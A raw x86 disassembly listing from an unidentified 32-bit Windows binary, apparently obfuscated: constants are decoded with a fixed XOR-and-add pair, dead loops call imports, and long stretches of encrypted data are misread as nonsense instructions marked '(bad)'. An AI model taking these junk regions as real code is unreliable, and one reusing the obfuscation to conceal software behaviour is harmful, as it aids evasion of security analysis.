  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x557c2fbc]
  40e122:	cmc    
  40e123:	dec    ebx
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e176
  40e12d:	jb     0x40e0e7
  40e12f:	and    BYTE PTR [ebp+0x6c],0x82
  40e133:	inc    ebp
  40e134:	pop    ss
  40e135:	cli    
  40e136:	std    
  40e137:	pop    es
  40e138:	aas    
  40e139:	into   
  40e13a:	repz es dec eax
  40e13d:	sar    DWORD PTR [ebx+ecx*2+0x46],cl
  40e141:	cmp    DWORD PTR [eax-0x21f12704],ebp
  40e147:	mov    ebx,0xb40a8ea3
  40e14c:	pop    ecx
  40e14d:	div    bl
  40e14f:	push   esp
  40e150:	pop    ss
  40e151:	mov    eax,ds:0x8ab227fd
  40e156:	cmp    al,0x17
  40e158:	push   0xad37d684
  40e15d:	fsub   DWORD PTR [ebx-0x185e53d6]
  40e163:	sbb    eax,0x60c4e6df
  40e168:	mov    ds:0x9f3f2c18,eax
  40e16d:	iret   
  40e16e:	sub    DWORD PTR [esi],edx
  40e170:	or     esp,DWORD PTR [eax]
  40e172:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40e174:	inc    ebp
  40e175:	jns    0x40e11a
  40e177:	cmp    eax,0x8a6727de
  40e17c:	and    al,0xb2
  40e17e:	(bad)  
  40e17f:	(bad)  
  40e181:	(bad)
  40e185:	fstp   DWORD PTR [ebp+0x3774a66]
  40e18b:	lods   al,BYTE PTR ds:[esi]
  40e18c:	jb     0x40e18b
  40e18e:	inc    edx
  40e18f:	repz push eax
  40e191:	xchg   edx,eax
  40e192:	push   ebx
  40e193:	fcom   DWORD PTR [ecx*8+0x665a364]
  40e19a:	shr    DWORD PTR [edx+0x1c],0x19
  40e19e:	inc    eax
  40e19f:	and    BYTE PTR [edx+0x2e],dh
  40e1a2:	cmp    ebx,0xffffffdb
  40e1a5:	xchg   edi,eax
  40e1a6:	or     eax,0xb0ad4286
  40e1ab:	mov    al,ds:0xaa4fd9a9
  40e1b0:	repnz cmp DWORD PTR [edi],edx
  40e1b3:	xchg   ebp,eax
  40e1b4:	cli    
  40e1b5:	add    DWORD PTR ds:0xa7213643,edi
  40e1bb:	and    al,BYTE PTR [edi+0x31]
  40e1be:	(bad)  
  40e1bf:	and    al,0x9c
  40e1c1:	nop
  40e1c2:	push   ebx
  40e1c3:	jmp    0x6c04:0xceba610f
  40e1ca:	mov    eax,ds:0xa47f7c91
  40e1cf:	out    0x8d,eax
  40e1d1:	out    0x97,al
  40e1d3:	cmp    edi,DWORD PTR [edx-0x7]
  40e1d6:	fs (bad) 
  40e1d8:	or     eax,0x370682eb
  40e1dd:	cmp    DWORD PTR [ebp+0x2e04d39],0xed136768
  40e1e7:	push   esi
  40e1e8:	arpl   WORD PTR ds:[ebx+0x7],cx
  40e1ec:	test   esp,esp
  40e1ee:	fs popf 
  40e1f0:	je     0x40e26a
  40e1f2:	cmp    eax,0x7d7a9b95
  40e1f7:	adc    DWORD PTR [edx],ebp
  40e1f9:	loopne 0x40e25e
  40e1fb:	adc    edx,DWORD PTR [esi-0x10]
  40e1fe:	pop    esp
  40e1ff:	leave  
  40e200:	mov    eax,0xd313d9ee
  40e205:	test   BYTE PTR [bx-0x22],0x31
  40e20a:	inc    ebp
  40e20b:	cs in  al,0xfc
  40e20e:	add    BYTE PTR [esi+0x9e68b49],ah
  40e214:	pop    esi
  40e215:	(bad)  
  40e216:	(bad)  
  40e217:	repnz sahf 
  40e219:	cmp    eax,0xcc6b2d1
  40e21e:	pop    ebp
  40e21f:	xchg   ebx,eax
  40e220:	dec    esi
  40e221:	pusha  
  40e222:	mov    al,0x64
  40e224:	jecxz  0x40e238
  40e226:	clc    
  40e227:	aad    0x57
  40e229:	mov    ebp,0xf2b98e1
  40e22e:	jb     0x40e1e7
  40e230:	xchg   ecx,eax
  40e231:	cli    
  40e232:	xchg   esi,eax
  40e233:	imul   ebp,DWORD PTR [edi],0x2f
  40e236:	sub    ebp,DWORD PTR [ebp+0x26]
  40e239:	int    0x7d
  40e23b:	xor    DWORD PTR [edx-0x7b713952],ebp
  40e241:	dec    esp
  40e242:	arpl   WORD PTR [edx-0x1e],ax
  40e245:	ja     0x40e206
  40e247:	adc    ebx,edx
  40e249:	and    BYTE PTR [edi-0x6b0fca75],0x41
  40e250:	aaa    
  40e251:	mov    ebp,0x72947568
  40e256:	lods   eax,DWORD PTR ds:[esi]
  40e257:	jns    0x40e1fa
  40e259:	mov    bl,0x7c
  40e25b:	mov    dh,0xb
  40e25d:	inc    esi
  40e25e:	cmp    DWORD PTR [ebx+eax*8],eax
  40e261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e262:	loope  0x40e248
  40e264:	cmc    
  40e265:	push   ecx
  40e266:	(bad)  
  40e267:	retf   0x730b
  40e26a:	loop   0x40e2c9
  40e26c:	mov    ebp,0x3be93e3b
  40e271:	mov    cl,0xa7
  40e273:	add    BYTE PTR [ebp+0x28ae2a1f],ch
  40e279:	mov    DWORD PTR [ecx],eax
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fcfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	jg     0x40e3eb
  40e378:	loop   0x40e32e
  40e37a:	cmp    esp,DWORD PTR [eax+esi*2+0x707fc370]
  40e381:	jo     0x40e3fb
  40e383:	cmp    edi,0x63
  40e386:	jg     0x40e3b7
  40e388:	(bad)  
  40e389:	aaa    
  40e38a:	out    dx,al
  40e38b:	cmp    ecx,edi
  40e38d:	in     eax,0x56
  40e38f:	test   BYTE PTR ds:0xa8604a22,al
  40e395:	xor    eax,0x17
  40e398:	pop    ecx
  40e399:	mov    ds:0xb50f1e93,eax
  40e39e:	sbb    al,0x3e
  40e3a0:	in     eax,0x9e
  40e3a2:	xchg   edi,eax
  40e3a3:	and    eax,0x2ff7e720
  40e3a8:	cdq    
  40e3a9:	cdq    
  40e3aa:	rol    BYTE PTR [edi-0x63],1
  40e3ad:	mov    ah,0x82
  40e3af:	jecxz  0x40e423
  40e3b1:	mov    edx,0x42bc6365
  40e3b6:	cld    
  40e3b7:	mov    bh,BYTE PTR [ecx]
  40e3b9:	dec    edi
  40e3ba:	repnz mov ch,0x76
  40e3bd:	xchg   ebx,eax
  40e3be:	add    al,0x98
  40e3c0:	push   ss
  40e3c1:	ins    BYTE PTR es:[edi],dx
  40e3c2:	test   eax,0x9a1067a3
  40e3c7:	stos   DWORD PTR es:[edi],eax
  40e3c8:	or     eax,DWORD PTR [ebx]
  40e3ca:	dec    edi
  40e3cb:	jecxz  0x40e363
  40e3cd:	xchg   ebp,eax
  40e3ce:	shl    DWORD PTR [eax],1
  40e3d0:	sub    BYTE PTR [edx],0xb3
  40e3d3:	fld    DWORD PTR [ebp+0x1f]
  40e3d6:	scas   eax,DWORD PTR es:[edi]
  40e3d7:	cmp    ebp,edi
  40e3d9:	xor    al,0x82
  40e3db:	mov    ah,0x22
  40e3dd:	mov    dh,0xcd
  40e3df:	and    esp,DWORD PTR [eax+edx*4-0x2]
  40e3e3:	aam    0x6d
  40e3e5:	sbb    al,0x1f
  40e3e7:	ret    0xb55f
  40e3ea:	cmp    ch,bh
  40e3ec:	test   al,0x1f
  40e3ee:	je     0x40e3d0
  40e3f0:	push   ebp
  40e3f1:	(bad)
  40e3f6:	mov    ebp,0x7fccb10d
  40e3fb:	mov    dl,0x22
  40e3fd:	xchg   esi,eax
  40e3fe:	jge    0x40e470
  40e400:	and    BYTE PTR [eax],bl
  40e402:	out    0x9a,eax
  40e404:	mov    dl,0x9c
  40e406:	jne    0x40e409
  40e408:	add    DWORD PTR [ebp-0x1f],ebx
  40e40b:	jo     0x40e456
  40e40d:	aam    0xbb
  40e40f:	shl    DWORD PTR [edx-0x1dde2ed4],1
  40e415:	or     DWORD PTR [ebx-0x36],edi
  40e418:	pusha  
  40e419:	cmp    bl,BYTE PTR [ecx]
  40e41b:	cdq    
  40e41c:	and    BYTE PTR [edi+0x6f],al
  40e41f:	cmc    
  40e420:	push   ds
  40e421:	lods   al,BYTE PTR ds:[esi]
  40e422:	cmp    DWORD PTR [ebp+0xf],esi
  40e425:	adc    ah,dh
  40e427:	in     eax,dx
  40e428:	out    dx,al
  40e429:	xor    cl,BYTE PTR ds:0x366d017f
  40e42f:	stos   BYTE PTR es:[edi],al
  40e430:	inc    edx
  40e431:	sbb    ch,BYTE PTR [edx]
  40e433:	fdivrp st(3),st
  40e435:	hlt    
  40e436:	mov    esp,0xbb2391fb
  40e43b:	jns    0x40e45e
  40e43d:	dec    edi
  40e43e:	stc    
  40e43f:	mov    eax,0xc697e986
  40e444:	cmp    ch,ch
  40e446:	call   0xdde2:0x11ff3b9f
  40e44d:	mov    eax,ebp
  40e44f:	pusha  
  40e450:	add    bh,ch
  40e452:	int3   
  40e453:	mov    es,WORD PTR [edi]
  40e455:	out    dx,eax
  40e456:	push   cs
  40e457:	mov    eax,ds:0x938c065e
  40e45c:	sbb    DWORD PTR [ebx+ebp*2+0x7c8c6b42],esi
  40e463:	test   DWORD PTR [esi-0x5b8e0ee],eax
  40e469:	out    dx,al
  40e46a:	mov    esi,0xc42726a9
  40e46f:	rol    DWORD PTR [ebx],cl
  40e471:	test   DWORD PTR [edx+0x43f28b51],0x48ad1748
  40e47b:	adc    al,0xf0
  40e47d:	test   esi,eax
  40e47f:	sbb    al,0x92
  40e481:	dec    edi
  40e482:	lahf   
  40e483:	pop    es
  40e484:	inc    ebx
  40e485:	icebp  
  40e486:	inc    esi
  40e487:	inc    ecx
  40e488:	xor    bl,BYTE PTR [ecx]
  40e48a:	shl    ah,0x63
  40e48d:	imul   edi,DWORD PTR [ecx+0x37],0xffffffad
  40e491:	inc    esp
  40e492:	pusha  
  40e493:	in     eax,dx
  40e494:	push   edi
  40e495:	adc    al,0xe8
  40e497:	stc    
  40e498:	daa    
  40e499:	in     al,0x99
  40e49b:	cld    
  40e49c:	mov    esi,0x26f2a544
  40e4a1:	jmp    0xc9a0:0x8f89c85b
  40e4a8:	mov    ebp,fs
  40e4aa:	dec    ebx
  40e4ab:	sti    
  40e4ac:	jl     0x40e4a6
  40e4ae:	add    eax,0x6f
  40e4b1:	int3   
  40e4b2:	mov    dl,0xd
  40e4b4:	and    DWORD PTR [ecx-0x3],0x1e
  40e4b8:	jle    0x40e48f
  40e4ba:	dec    ecx
  40e4bb:	add    BYTE PTR [ecx+0x4a],ah
  40e4be:	adc    dh,dl
  40e4c0:	mov    dl,0x94
  40e4c2:	mov    bl,0x2a
  40e4c4:	xchg   esp,eax
  40e4c5:	jle    0x40e47f
  40e4c7:	cwde   
  40e4c8:	mov    WORD PTR [ecx-0x22487384],cs
  40e4ce:	adc    al,0xc7
  40e4d0:	inc    ebp
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x1647740f
  40e4f5:	jbe    0x40e47a
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	das    
  40e500:	jg     0x40e4cf
  40e502:	sbb    DWORD PTR [ebx+edi*2+0x38],esp
  40e506:	sub    DWORD PTR [ecx-0x4c],edx
  40e509:	xor    eax,0xe11964be
  40e50e:	frstor [esi]
  40e510:	adc    eax,0x971abcfd
  40e515:	sub    al,0xd7
  40e517:	jmp    0x464f0e6d
  40e51c:	xchg   bh,ch
  40e51e:	mov    cl,0x7a
  40e520:	bound  esi,QWORD PTR [esi]
  40e522:	and    edx,esp
  40e524:	aam    0xa6
  40e526:	jecxz  0x40e599
  40e528:	call   esp
  40e52a:	fimul  DWORD PTR [edx+ecx*8+0x3f]
  40e52e:	shl    esp,cl
  40e530:	out    0x32,eax
  40e532:	icebp  
  40e533:	scas   al,BYTE PTR es:[edi]
  40e534:	sbb    bl,BYTE PTR [ecx+0x7b]
  40e537:	inc    ecx
  40e538:	sahf   
  40e539:	dec    edx
  40e53a:	mov    edi,0x510ec6cb
  40e53f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e541:	neg    DWORD PTR [edx]
  40e543:	jecxz  0x40e562
  40e545:	xchg   esp,eax
  40e546:	mov    ebp,0xa2811026
  40e54b:	mov    eax,ds:0x48bac477
  40e550:	xchg   BYTE PTR [eax+0x67a1761f],ch
  40e556:	mov    eax,0x9400c4da
  40e55b:	adc    esp,esp
  40e55d:	xchg   ebx,eax
  40e55e:	outs   dx,DWORD PTR ds:[esi]
  40e55f:	pop    ebx
  40e560:	rcl    BYTE PTR [ecx+0x14],0xc0
  40e564:	dec    ebp
  40e565:	adc    ah,BYTE PTR [ecx+0x24]
  40e568:	dec    ebp
  40e569:	xchg   edi,eax
  40e56a:	imul   esi,eax,0xa305a6be
  40e570:	or     al,0x90
  40e572:	sub    eax,0xad6a18e0
  40e577:	rcl    esp,0xd6
  40e57a:	dec    eax
  40e57b:	add    al,0xf0
  40e57d:	test   BYTE PTR ss:[edi],0x74
  40e581:	mov    dh,0xe1
  40e583:	mov    edi,0xda7458b7
  40e588:	(bad)  
  40e589:	(bad)  
  40e58a:	hlt    
  40e58b:	ja     0x40e527
  40e58d:	jnp    0x40e533
  40e58f:	ja     0x40e548
  40e591:	lea    ebx,[eax+0x5]
  40e594:	cld    
  40e595:	scas   al,BYTE PTR es:[edi]
  40e596:	mov    dl,al
  40e598:	push   edi
  40e599:	cwde   
  40e59a:	enter  0x1ff1,0x8f
  40e59e:	inc    cl
  40e5a0:	add    ebx,eax
  40e5a2:	and    dh,ch
  40e5a4:	dec    esp
  40e5a5:	daa    
  40e5a6:	sub    DWORD PTR [esi+0x37246016],ebx
  40e5ac:	mov    eax,0xa1d8d100
  40e5b1:	shr    BYTE PTR [ebp+0x1b0a093a],cl
  40e5b7:	aaa    
  40e5b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5b9:	adc    esi,0x17
  40e5bc:	add    eax,0xf0c623a2
  40e5c1:	out    dx,al
  40e5c2:	iret   
  40e5c3:	adc    bh,BYTE PTR [ebp-0x24eed6c]
  40e5c9:	dec    ebx
  40e5ca:	or     BYTE PTR [esi-0x2a38b505],ah
  40e5d0:	mov    ds:0xfa050e86,eax
  40e5d5:	mov    eax,0xcf1c3974
  40e5da:	lds    ecx,FWORD PTR [edx-0x32]
  40e5dd:	stc    
  40e5de:	stos   DWORD PTR es:[edi],eax
  40e5df:	sbb    BYTE PTR [edi-0x57],ah
  40e5e2:	cld    
  40e5e3:	sub    dh,bl
  40e5e5:	cdq    
  40e5e6:	loopne 0x40e5cf
  40e5e8:	add    eax,0xf70a5a94
  40e5ed:	lock push ecx
  40e5ef:	call   0xe1f1:0xc7b4149b
  40e5f6:	sub    BYTE PTR [ebx-0x3f],dl
  40e5f9:	mov    al,0x64
  40e5fb:	mov    ah,0x5b
  40e5fd:	ds push ecx
  40e5ff:	jne    0x40e59a
  40e601:	adc    cl,BYTE PTR [edi+ebp*1+0x17]
  40e605:	shl    BYTE PTR [ecx-0x4b0c0ec8],1
  40e60b:	adc    edx,DWORD PTR [edi]
  40e60d:	dec    esp
  40e60e:	dec    edi
  40e60f:	aaa    
  40e610:	push   ds
  40e611:	jl     0x40e689
  40e613:	popa   
  40e614:	clc    
  40e615:	inc    edi
  40e616:	adc    esi,0x6eb2ff8a
  40e61c:	xchg   edi,edi
  40e61e:	fisub  WORD PTR [esi-0x1]
  40e621:	cmc    
  40e622:	jmp    0xc8bad040
  40e627:	lahf   
  40e628:	cmp    BYTE PTR [edi-0x31df74b5],bl
  40e62e:	mov    ds:0xdec822c0,al
  40e633:	(bad)  
  40e635:	shr    ebp,0x23
  40e638:	dec    ebx
  40e639:	jae    0x40e615
  40e63b:	sbb    BYTE PTR [esi-0x1b],al
  40e63e:	cmp    al,0x3a
  40e640:	ins    BYTE PTR es:[edi],dx
  40e641:	dec    edx
  40e642:	xor    eax,0xdc7737e
  40e647:	jns    0x40e5fc
  40e649:	or     BYTE PTR [ebp-0x36],dl
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fd7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	add    ah,BYTE PTR [eax]
  40e6dc:	jecxz  0x40e70a
  40e6de:	push   ecx
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	je     0x40e766
  40e6e8:	xchg   esp,eax
  40e6e9:	xor    BYTE PTR [eax+eiz*1+0x3b0a4aa5],0x7a
  40e6f1:	cmp    edi,DWORD PTR [ecx]
  40e6f3:	sar    BYTE PTR [edi+edx*1+0x39],1
  40e6f7:	or     eax,0x44fe5875
  40e6fc:	ret    
  40e6fd:	cmp    BYTE PTR [esi-0x3e402b36],dh
  40e703:	mov    dl,0x37
  40e705:	lea    esi,[ebp-0x7a1fefa2]
  40e70b:	xchg   esi,eax
  40e70c:	in     al,dx
  40e70d:	or     esi,DWORD PTR [ebp+0x790ac417]
  40e713:	adc    al,0x1c
  40e715:	xchg   esi,eax
  40e716:	push   es
  40e717:	jbe    0x40e6b8
  40e719:	aam    0x46
  40e71b:	sbb    edx,DWORD PTR [edi]
  40e71d:	sbb    esp,DWORD PTR [ecx-0x6]
  40e720:	push   eax
  40e721:	lods   eax,DWORD PTR ds:[esi]
  40e722:	dec    edx
  40e723:	xchg   edx,eax
  40e724:	stos   BYTE PTR es:[edi],al
  40e725:	test   al,0x9d
  40e727:	fnstenv [ebp-0xb]
  40e72a:	add    cl,bl
  40e72c:	sub    ecx,edi
  40e72e:	adc    BYTE PTR [ebx+0x4],dl
  40e731:	fcom   st(6)
  40e733:	je     0x40e6d4
  40e735:	add    al,0x1c
  40e737:	ds xchg esp,eax
  40e73a:	loop   0x40e709
  40e73c:	mov    edx,0x757dcc22
  40e741:	pusha  
  40e742:	imul   ecx,DWORD PTR [eax-0x1b],0x3403e392
  40e749:	pushf  
  40e74a:	mov    ebp,0xf8fcaa40
  40e74f:	jo     0x40e712
  40e751:	or     al,0x78
  40e753:	push   es
  40e754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e755:	and    al,dh
  40e757:	mov    edx,0x69b0be44
  40e75c:	loop   0x40e774
  40e75e:	sub    ecx,DWORD PTR [ecx+0x43]
  40e761:	or     al,BYTE PTR [esi]
  40e763:	jecxz  0x40e735
  40e765:	cdq    
  40e766:	ja     0x40e78e
  40e768:	repnz sti 
  40e76a:	call   0x1e1c994f
  40e76f:	scas   al,BYTE PTR es:[edi]
  40e770:	std    
  40e771:	push   eax
  40e772:	push   esi
  40e773:	sbb    al,0xd
  40e775:	xor    BYTE PTR [edx-0x8],0x96
  40e779:	cld    
  40e77a:	outs   dx,BYTE PTR ds:[esi]
  40e77b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e77c:	jp     0x40e73e
  40e77e:	push   edx
  40e77f:	xchg   ebx,eax
  40e780:	push   esi
  40e781:	in     eax,dx
  40e782:	inc    ecx
  40e783:	test   DWORD PTR [esi+0x2ffbabb7],edi
  40e789:	or     BYTE PTR [ecx],dl
  40e78b:	sbb    DWORD PTR [ecx],ebp
  40e78d:	and    esp,DWORD PTR [edi-0x62044e86]
  40e793:	fisttp DWORD PTR [eax+0x6411b1a5]
  40e799:	adc    eax,0x233de898
  40e79e:	pop    edx
  40e79f:	jnp    0x40e77c
  40e7a1:	push   edx
  40e7a2:	inc    ebp
  40e7a3:	xchg   ecx,eax
  40e7a4:	call   0xc56026e1
  40e7a9:	dec    ebx
  40e7aa:	js     0x40e77c
  40e7ac:	daa    
  40e7ad:	outs   dx,BYTE PTR ds:[esi]
  40e7ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7af:	inc    ebp
  40e7b0:	jnp    0x40e77a
  40e7b2:	add    dh,bh
  40e7b4:	lds    ebp,FWORD PTR [eax]
  40e7b6:	dec    ecx
  40e7b7:	xor    DWORD PTR [edi+eax*8],eax
  40e7ba:	sar    BYTE PTR [ecx],1
  40e7bc:	or     BYTE PTR [ecx+edx*4-0x4c],bh
  40e7c0:	arpl   WORD PTR [ebp-0x7826f0a9],ax
  40e7c6:	fld    st(0)
  40e7c8:	js     0x40e823
  40e7ca:	call   0x3620d4d8
  40e7cf:	stos   DWORD PTR es:[edi],eax
  40e7d0:	xchg   ebp,eax
  40e7d1:	outs   dx,DWORD PTR ds:[esi]
  40e7d2:	add    eax,0xec530f85
  40e7d7:	pop    DWORD PTR [ebp+eiz*1-0x5f9649f3]
  40e7de:	out    dx,eax
  40e7df:	mov    ecx,0x6dc23cd
  40e7e4:	(bad)  
